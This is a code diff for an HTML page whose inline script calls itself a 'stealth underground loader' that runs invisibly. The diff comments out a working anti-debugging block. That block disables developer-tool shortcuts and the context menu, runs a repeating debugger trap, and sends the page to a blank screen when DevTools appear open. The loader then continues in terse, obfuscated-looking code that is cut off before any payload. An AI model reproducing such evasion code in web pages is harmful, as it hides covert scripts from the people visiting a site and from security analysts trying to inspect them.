@@ -7,27 +7,27 @@
     <script>
         // ========== STEALTH UNDERGROUND LOADER ==========
         // All operations invisible - no visible HTML output
-        // ========== DEBUGGER PROTECTION ==========
-        (function(w,d){
-            // Block devtools shortcuts (F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S)
-            d.addEventListener('keydown',function(e){
-                if(e.keyCode===123){e.preventDefault();return false;}
-                if(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74||e.keyCode===67)){e.preventDefault();return false;}
-                if(e.ctrlKey&&(e.keyCode===85||e.keyCode===83)){e.preventDefault();return false;}
-            });
-            d.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
+        // // ========== DEBUGGER PROTECTION ==========
+        // (function(w,d){
+        //     // Block devtools shortcuts (F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S)
+        //     d.addEventListener('keydown',function(e){
+        //         if(e.keyCode===123){e.preventDefault();return false;}
+        //         if(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74||e.keyCode===67)){e.preventDefault();return false;}
+        //         if(e.ctrlKey&&(e.keyCode===85||e.keyCode===83)){e.preventDefault();return false;}
+        //     });
+        //     d.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
 
-            // Continuous debugger trap
-            (function _dt(){try{(function(){return false;})['constructor']('debugger')();}catch(e){}setTimeout(_dt,50);})();
+        //     // Continuous debugger trap
+        //     (function _dt(){try{(function(){return false;})['constructor']('debugger')();}catch(e){}setTimeout(_dt,50);})();
 
-            // DevTools size detection - redirect if opened
-            var _threshold=160;
-            setInterval(function(){
-                var wDiff=w.outerWidth-w.innerWidth>_threshold;
-                var hDiff=w.outerHeight-w.innerHeight>_threshold;
-                if(wDiff||hDiff){w.location.replace('about:blank');}
-            },1000);
-        })(window,document);
+        //     // DevTools size detection - redirect if opened
+        //     var _threshold=160;
+        //     setInterval(function(){
+        //         var wDiff=w.outerWidth-w.innerWidth>_threshold;
+        //         var hDiff=w.outerHeight-w.innerHeight>_threshold;
+        //         if(wDiff||hDiff){w.location.replace('about:blank');}
+        //     },1000);
+        // })(window,document);
 
         (function(w,d,n){
             var _rnd=Math.random,_flr=Math.floor,_rn=function(x){return _flr(_rnd()*x)};
